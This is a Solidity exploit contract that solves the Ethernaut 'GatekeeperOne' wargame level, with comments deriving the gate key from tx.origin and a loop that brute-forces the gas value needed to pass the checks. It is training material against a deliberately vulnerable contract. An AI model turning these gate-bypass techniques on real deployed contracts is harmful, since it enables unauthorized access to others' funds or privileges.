// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {GatekeeperOne} from "ethernaut/levels/GatekeeperOne.sol";

contract Attacker {
    address owner;
    GatekeeperOne target;
    bytes8 key;
    uint256 public $gas;

    constructor(GatekeeperOne _target, uint256 _gas) {
        target = _target;
        // We are using an 8-byte key, so suppose the key is `ABCD` where each letter is 2 bytes (16 bits).
        //
        // 1. `CD == D` so `C`: must be all zeros.
        // 2. `CD != ABCD` so `AB` must **not** be all zeros.
        // 3. `CD == uint16(tx.origin)`: `C` is already zeros, and now we know that `D` will be the last 16-bits of `tx.origin`.
        //
        // Masking our key with 0xFFFF_FFFF_0000_FFFF should do the trick too.
        key = bytes8(bytes.concat(hex"00000001", hex"0000", bytes2(uint16(uint160(tx.origin)))));

        // loop to get the right gas amount
        // saves the correct gas on storage, so you can run it once to find the
        // correct amount, and run with that amount later
        for (uint256 i = 0; i <= 8191; i++) {
            uint256 gas = _gas - i;

            try target.enter{gas: gas}(key) {
                $gas = gas;
                break;
            } catch {}
        }
    }
}
